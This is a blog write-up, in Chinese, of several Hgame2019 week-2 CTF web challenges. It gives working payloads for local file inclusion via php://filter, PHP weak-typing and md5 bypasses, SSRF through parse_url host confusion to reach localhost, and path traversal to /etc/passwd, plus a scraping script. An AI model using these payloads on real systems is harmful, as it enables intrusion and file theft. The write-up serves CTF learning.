<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="杭电Hgame2019-week2-WP"><meta name="keywords" content="php,爬虫"><meta name="author" content="V0WKeep3r,v0wldl@163.com"><meta name="copyright" content="V0WKeep3r"><title>杭电Hgame2019-week2-WP | V0W's Blog</title><link rel="shortcut icon" href="/favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.6.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.6.1"><link rel="dns-prefetch" href="https://cdn.staticfile.org"><link rel="dns-prefetch" href="https://cdn.bootcss.com"><link rel="dns-prefetch" href="https://creativecommons.org"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容:${query}"}},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  }
} </script><meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/atom.xml" title="V0W's Blog" type="application/atom+xml">
</head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-php"><span class="toc-text">easy_php</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php-trick"><span class="toc-text">php trick</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP-Is-The-Best-Language"><span class="toc-text">PHP Is The Best Language</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Baby-Spider"><span class="toc-text">Baby_Spider</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Math%E6%9C%89%E8%B6%A3"><span class="toc-text">Math有趣</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Crypto"><span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%AA%E6%BC%AB%E7%9A%84%E8%B6%B3%E7%90%83%E5%9C%A3%E5%9C%B0"><span class="toc-text">浪漫的足球圣地</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hill"><span class="toc-text">hill</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vigener"><span class="toc-text">Vigener~</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc"><span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Are-You-Familiar-with-DNS-Records"><span class="toc-text">Are You Familiar with DNS Records?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BF%AB%E5%88%B0%E7%81%AB%E7%82%89%E6%97%81%E6%89%BE%E4%B8%AA%E4%BD%8D%E7%BD%AE%E5%9D%90%E5%9D%90%EF%BC%81"><span class="toc-text">快到火炉旁找个位置坐坐！</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%BE%E5%BE%97%E5%88%B0%E6%88%91%E5%98%9B%EF%BC%9F%E5%B0%8F%E7%81%AB%E6%B1%81"><span class="toc-text">找得到我嘛？小火汁</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%9D%E8%AF%86%E4%BA%8C%E7%BB%B4%E7%A0%81"><span class="toc-text">初识二维码</span></a></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/Kaneki.jpg"></div><div class="author-info__name text-center">V0WKeep3r</div><div class="author-info__description text-center">Stay Hungry, Stay Foolish.</div><div class="follow-button"><a target="_blank" rel="noopener" href="https://github.com/qingchenldl">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">56</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">30</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">分类</span><span class="pull-right">11</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">友链</div><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://zhuxianjin.github.io/">J0k3r</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://p0desta.com/">p0desta</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://daolgts.github.io/">dlgts</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://iwenhu.cn/">mengchen</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://p0sec.net/">p0</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://asa9ao.xyz/">唯湖</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://seaii-blog.com/">seaii</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://wzt.ac.cn/">WCatalpa.T</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://syf.ac.cn/">7N1ght</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://www.nicefish.top/posts/">nicefish</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://flag0.com/">GetFlag</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(/img/index.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">V0W's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> 搜索</span></a><a class="site-page" href="/">主页</a><a class="site-page" href="/archives">文章</a><a class="site-page" href="/tags">标签</a><a class="site-page" href="/categories">分类</a><a class="site-page" href="/about">关于我</a></span></div><div id="post-info"><div id="post-title">杭电Hgame2019-week2-WP</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-02-10</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/CTF/">CTF</a><div class="post-meta-wordcount"><span>字数总计: </span><span class="word-count">3.4k</span><span class="post-meta__separator">|</span><span>阅读时长: 17 分钟</span></div></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="easy-php"><a href="#easy-php" class="headerlink" title="easy_php"></a>easy_php</h2><blockquote>
<p>描述<br>代码审计♂第二弹<br>URL <a target="_blank" rel="noopener" href="http://118.24.25.25:9999/easyphp/index.html">http://118.24.25.25:9999/easyphp/index.html</a></p>
</blockquote>
<p><code>robots.txt</code>得到<code>img/index.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    $img = $_GET[<span class="string">&#x27;img&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($img))</span><br><span class="line">        $img = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    $img = str_replace(<span class="string">&#x27;../&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $img);</span><br><span class="line">    <span class="keyword">include_once</span>($img.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>本地文件包含，双写绕过过滤就行</p>
<p><strong>payload</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;118.24.25.25:9999&#x2F;easyphp&#x2F;img&#x2F;index.php?img&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;...&#x2F;.&#x2F;flag</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PD9waHAKICAgIC8vJGZsYWcgPSAnaGdhbWV7WW91XzRyZV9Tb19nMG9kfSc7CiAgICBlY2hvICJtYXliZV95b3Vfc2hvdWxkX3RoaW5rX3RoaW5rIjsK </span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span>     <span class="comment">//$flag = &#x27;hgame&#123;You_4re_So_g0od&#125;&#x27;;     echo &quot;maybe_you_should_think_think&quot;; </span></span><br></pre></td></tr></table></figure>

<p><strong>flag</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hgame&#123;You_4re_So_g0od&#125;</span><br></pre></td></tr></table></figure>



<h2 id="php-trick"><a href="#php-trick" class="headerlink" title="php trick"></a>php trick</h2><blockquote>
<p>描述<br>some php tricks<br>URL <a target="_blank" rel="noopener" href="http://118.24.3.214:3001/">http://118.24.3.214:3001</a></p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//admin.php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$str1 = (<span class="keyword">string</span>)@$_GET[<span class="string">&#x27;str1&#x27;</span>];</span><br><span class="line">$str2 = (<span class="keyword">string</span>)@$_GET[<span class="string">&#x27;str2&#x27;</span>];</span><br><span class="line">$str3 = @$_GET[<span class="string">&#x27;str3&#x27;</span>];</span><br><span class="line">$str4 = @$_GET[<span class="string">&#x27;str4&#x27;</span>];</span><br><span class="line">$str5 = @$_GET[<span class="string">&#x27;H_game&#x27;</span>];</span><br><span class="line">$url = @$_GET[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>( $str1 == $str2 )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;step 1 fail&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( md5($str1) != md5($str2) )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;step 2 fail&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( $str3 == $str4 )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;step 3 fail&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( md5($str3) !== md5($str4))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;step 4 fail&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (strpos($_SERVER[<span class="string">&#x27;QUERY_STRING&#x27;</span>], <span class="string">&quot;H_game&quot;</span>) !==<span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;step 5 fail&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(is_numeric($str5))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;step 6 fail&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($str5&lt;<span class="number">9999999999</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;step 7 fail&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">string</span>)$str5&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;step 8 fial&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (parse_url($url, PHP_URL_HOST) !== <span class="string">&quot;www.baidu.com&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;step 9 fail&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (parse_url($url,PHP_URL_SCHEME) !== <span class="string">&quot;http&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;step 10 fail&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">$ch = curl_init();</span><br><span class="line">curl_setopt($ch,CURLOPT_URL,$url);</span><br><span class="line">$output = curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line"><span class="keyword">if</span>($output === <span class="literal">FALSE</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;step 11 fail&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> $output;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>几个简单的php trick</p>
<ol>
<li>md5+ php弱类型</li>
<li>md5不处理数组</li>
<li>php在接受数据时会自动把’+‘和’.‘替换为’_’</li>
<li>php中数字总是比数组小</li>
</ol>
<p>之后发现像是一个SSRF, 结合访问<code>admin.php</code>得到的提示：<code>only localhost can see it</code>，而可以推测，这里是通过SSRF来读文件。</p>
<p>但是代码中有一小段对url做了过滤，需要绕过一下, 参考<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/b31b7b1ca3cb">https://www.jianshu.com/p/b31b7b1ca3cb</a></p>
<p>原理：主要利用<code>parse_url</code>将最后一个有效的<code>@host</code>作为host。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (parse_url($url, PHP_URL_HOST) !== <span class="string">&quot;www.baidu.com&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;step 9 fail&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (parse_url($url,PHP_URL_SCHEME) !== <span class="string">&quot;http&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;step 10 fail&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后的payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;118.24.3.214:3001&#x2F;?str1&#x3D;240610708&amp;str2&#x3D;QNKCDZO&amp;str3[]&#x3D;123&amp;str4[]&#x3D;456&amp;H+game[]&#x3D;&amp;url&#x3D;http:&#x2F;&#x2F;@127.0.0.1:80@www.baidu.com&#x2F;admin.php</span><br></pre></td></tr></table></figure>

<p>之后，得到<code>admin.php</code>的内容</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] != <span class="string">&#x27;127.0.0.1&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;only localhost can see it&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">$filename = $_GET[<span class="string">&#x27;filename&#x27;</span>]??<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (file_exists($filename)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;sorry,you can&#x27;t see it&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents($filename);</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>不允许文件名为存在的文件名，笔者采用php伪协议文件流绕过：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?filename&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;flag.php</span><br></pre></td></tr></table></figure>

<p>也可以通过<code>xxxdir/../flag.php</code>方式绕过</p>
<p>最终payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;118.24.3.214:3001&#x2F;?str1&#x3D;240610708&amp;str2&#x3D;QNKCDZO&amp;str3[]&#x3D;123&amp;str4[]&#x3D;456&amp;H+game[]&#x3D;&amp;url&#x3D;http:&#x2F;&#x2F;@127.0.0.1:80@www.baidu.com&#x2F;admin.php?filename&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;flag.php</span><br></pre></td></tr></table></figure>
<p>flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PD9waHAgJGZsYWcgPSBoZ2FtZXtUaEVyNF9BcjRfczBtNF9QaHBfVHIxY2tzfSA&#x2F;Pgo&#x3D;</span><br><span class="line">&lt;?php $flag &#x3D; hgame&#123;ThEr4_Ar4_s0m4_Php_Tr1cks&#125; ?&gt; </span><br></pre></td></tr></table></figure>



<h2 id="PHP-Is-The-Best-Language"><a href="#PHP-Is-The-Best-Language" class="headerlink" title="PHP Is The Best Language"></a>PHP Is The Best Language</h2><blockquote>
<p>描述<br>var_dump了解一下<br>URL <a target="_blank" rel="noopener" href="http://118.25.89.91:8888/flag.php">http://118.25.89.91:8888/flag.php</a></p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;secret.php&#x27;</span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">#echo $flag; </span></span><br><span class="line"><span class="comment">#echo $secret; </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($_POST[<span class="string">&#x27;gate&#x27;</span>]) || <span class="keyword">empty</span>($_POST[<span class="string">&#x27;key&#x27;</span>])) &#123; </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">exit</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;door&#x27;</span>]))&#123; </span><br><span class="line">    $secret = hash_hmac(<span class="string">&#x27;sha256&#x27;</span>, $_POST[<span class="string">&#x27;door&#x27;</span>], $secret); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">$gate = hash_hmac(<span class="string">&#x27;sha256&#x27;</span>, $_POST[<span class="string">&#x27;key&#x27;</span>], $secret); </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($gate !== $_POST[<span class="string">&#x27;gate&#x27;</span>]) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Hacker GetOut!!&quot;</span>; </span><br><span class="line">    <span class="keyword">exit</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((md5($_POST[<span class="string">&#x27;key&#x27;</span>])+<span class="number">1</span>) == (md5(md5($_POST[<span class="string">&#x27;key&#x27;</span>])))+<span class="number">1</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Wow!!!&quot;</span>; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>; </span><br><span class="line">    <span class="keyword">echo</span> $flag; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Hacker GetOut!!&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>首先，<code>secret</code>用了一个<code>hash_mac</code>函数，这个函数有问题的，查手册，容易发现：</p>
<p><img src="https://i.loli.net/2019/02/20/5c6d5a12e2977.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hash_hmac( string $algo, string $data, string $key[, bool $raw_output &#x3D; FALSE] )</span><br></pre></td></tr></table></figure>

<p>函数处理的<code>$data</code>参数是数组的时候，会出错返回<code>NULL</code>,于是我们可以利用这一点使<code>secret</code>可控。php弱类型<code>null==0</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(md5($_POST[&#39;key&#39;])+1) &#x3D;&#x3D; (md5(md5($_POST[&#39;key&#39;])))+1</span><br></pre></td></tr></table></figure>

<p>一种是通过<code>md5($_POST[&#39;key&#39;]) == (md5(md5($_POST[&#39;key&#39;])))</code></p>
<p>二种是因为<code>+1</code>的存在，找到两个值开头数字相同的就可以了。</p>
<p>我选择第一种，找到了这个<code> 7r4lGXCH2Ksu2JNT3BYM</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">7r4lGXCH2Ksu2JNT3BYM</span><br><span class="line">md5(7r4lGXCH2Ksu2JNT3BYM) &#x3D;&gt;</span><br><span class="line">0e269ab12da27d79a6626d91f34ae849</span><br><span class="line">md5(md5(7r4lGXCH2Ksu2JNT3BYM)) &#x3D;&gt;</span><br><span class="line">0e48d320b2a97ab295f5c4694759889f</span><br></pre></td></tr></table></figure>

<p>求gate：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php&gt; var_dump(hash_hmac(&#39;sha256&#39;,</span><br><span class="line">&#39;7r4lGXCH2Ksu2JNT3BYM&#39;, NULL))</span><br><span class="line">string(64)</span><br><span class="line">&quot;81f581b7553943f5041f054ca92e5e7e490e2c40296a93d94d214f1</span><br><span class="line">36aa84fe6&quot;</span><br></pre></td></tr></table></figure>

<p>最终<strong>payload</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gate&#x3D;81f581b7553943f5041f054ca92e5e7e490e2c40296a93d94d214f136aa84fe6&amp;key&#x3D;7r4lGXCH2Ksu2JNT3BYM&amp;door[]&#x3D;1</span><br></pre></td></tr></table></figure>

<p><strong>flag</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hgame&#123;Php_MayBe_Not_Safe&#125;</span><br></pre></td></tr></table></figure>



<h2 id="Baby-Spider"><a href="#Baby-Spider" class="headerlink" title="Baby_Spider"></a>Baby_Spider</h2><blockquote>
<p>描述<br>Come to death in the ocean of mathematics together with Li4n0!<br>Answer 30 questions correctly in a row during 40 seconds(The calculation result is subject to python3),then you can get the flag. Enjoy it~<br>hint1:The most basic operation of a spider is to disguise itself.<br>hint2:Always believe only what you see with your own eyes<br>URL <a target="_blank" rel="noopener" href="http://111.231.140.29:10000/">http://111.231.140.29:10000</a></p>
</blockquote>
<p><strong>1-10 关</strong></p>
<p>正常的爬虫，但是注意加上UA头。</p>
<p><strong>11-20 关</strong></p>
<p>使用了一个很骚的反爬虫机制，更换了css中的字体。</p>
<p>使得浏览器显示的数字与content中的数字不同。</p>
<p>将字体下载下来，找到一一对应关系，写一个替换规则就好了。</p>
<p><strong>21-30关</strong></p>
<p>使用after伪元素做了替换，这里直接抓取一下css中真实的算式就可以了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">header=&#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">token=&#123;</span><br><span class="line">    <span class="string">&#x27;token&#x27;</span>:<span class="string">&#x27;T0tI6mS6pFyAISBhgrM8BN1k0MOdNM88&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">list=<span class="string">&#x27;1026943587&#x27;</span></span><br><span class="line">url=<span class="string">&#x27;http://111.231.140.29:10000/&#x27;</span></span><br><span class="line">url1=<span class="string">&#x27;http://111.231.140.29:10000/question&#x27;</span></span><br><span class="line">url2=<span class="string">&#x27;http://111.231.140.29:10000/solution&#x27;</span></span><br><span class="line">url3=<span class="string">&#x27;http://111.231.140.29:10000/statics/style.css&#x27;</span></span><br><span class="line">res = <span class="string">&#x27;&lt;span&gt;(.*?)=&#x27;</span></span><br><span class="line">r=requests.post(url=url,data=token)</span><br><span class="line">session=r.cookies</span><br><span class="line">print(<span class="string">&quot;[*] &quot;</span>+<span class="string">&quot;-&quot;</span>*<span class="number">40</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">10</span>):</span><br><span class="line">    math = re.findall(res, r.content.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    math = str(math)[<span class="number">2</span>:len(math) - <span class="number">3</span>]</span><br><span class="line">    print(<span class="string">&#x27;[+] %d :&#x27;</span>%i + math)</span><br><span class="line">    math = eval(math)</span><br><span class="line">    result = &#123;</span><br><span class="line">        <span class="string">&#x27;answer&#x27;</span>: math</span><br><span class="line">    &#125;</span><br><span class="line">    r=requests.post(url=url2,data=result,cookies=session,headers=header)</span><br><span class="line">    session = r.cookies</span><br><span class="line">    print(<span class="string">&quot;[*] &quot;</span> + <span class="string">&quot;-&quot;</span> * <span class="number">40</span>)</span><br><span class="line"></span><br><span class="line">tmp=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>,<span class="number">20</span>):</span><br><span class="line">    math = re.findall(res, r.content.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    math = str(math)[<span class="number">2</span>:len(math) - <span class="number">3</span>]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> math:</span><br><span class="line">        <span class="keyword">if</span> ord(j) &gt; <span class="number">47</span>:</span><br><span class="line">            tmp += list[int(j)]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tmp += j</span><br><span class="line">    math = tmp</span><br><span class="line">    tmp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    print(<span class="string">&#x27;[+] %d :&#x27;</span> % i + math)</span><br><span class="line">    answer = (eval(math))</span><br><span class="line">    result = &#123;</span><br><span class="line">        <span class="string">&#x27;answer&#x27;</span>: answer</span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(url=url2, data=result, cookies=session, headers=header)</span><br><span class="line">    session = r.cookies</span><br><span class="line">    print(<span class="string">&quot;[*] &quot;</span> + <span class="string">&quot;-&quot;</span> * <span class="number">40</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">res = <span class="string">&#x27;content:&quot;(.*?)=&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>,<span class="number">30</span>):</span><br><span class="line">    css = requests.get(url=url3, cookies=session, headers=header)</span><br><span class="line">    math = re.findall(res, css.content.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    math = str(math)[<span class="number">2</span>:len(math) - <span class="number">3</span>]</span><br><span class="line">    print(<span class="string">&#x27;[+] %d :&#x27;</span> % i + math)</span><br><span class="line">    answer = (eval(math))</span><br><span class="line">    result = &#123;</span><br><span class="line">        <span class="string">&#x27;answer&#x27;</span>: answer</span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(url=url2, data=result, cookies=session, headers=header)</span><br><span class="line">    session=r.cookies</span><br><span class="line">    print(<span class="string">&quot;[*] &quot;</span> + <span class="string">&quot;-&quot;</span> * <span class="number">40</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;hgame&quot;</span> <span class="keyword">in</span> r.content.decode(<span class="string">&#x27;utf-8&#x27;</span>):</span><br><span class="line">        print(r.content.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[+] 28 :3898465&#x2F;(242636442&#x2F;774712632&#x2F;627122699&#x2F;(524541058))</span><br><span class="line">[*] ----------------------------------------</span><br><span class="line">[+] 29 :(699759722&#x2F;65326526+789619879*78001637+875760928)</span><br><span class="line">[*] ----------------------------------------</span><br><span class="line">hgame&#123;88c240c943d3f724a0bb59ebe37a5a49da22e40c0a8b2e0e659131165ea18825&#125;</span><br></pre></td></tr></table></figure>



<h2 id="Math有趣"><a href="#Math有趣" class="headerlink" title="Math有趣"></a>Math有趣</h2><blockquote>
<p>描述<br>Math is interesting, isn’t it?<br>update: 题中最后的^是乘方，不是xor<br>hint: 了解一下tomcat、spring mvc的目录结构和配置文件(自己搭一下就明白了<br>hint2: 图片目录不在web目录下<br>URL <a target="_blank" rel="noopener" href="http://test.tan90.me:8080/index.php">http://test.tan90.me:8080/index.php</a></p>
</blockquote>
<p>回答完<code>1+1=2</code>后，正式进入题目，看到一个很复杂的数学问题，本想瞎子啊下来直接搜索看答案，但是发现下载下来文件叫<code>cXVlc3Rpb24ucG5n.php</code>。怎么这么奇怪，为什么还是php，这里会想到是有点像<code>url重写技术</code></p>
<p>但是明眼人一下就看出来，这只是一段简单的<code>base64</code>，这也就造成了任意文件读取：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cXVlc3Rpb24ucG5n						question.png</span><br><span class="line">Li4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA&#x3D;&#x3D;		..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2019/02/22/5c6f55f0f18cf.png"></p>
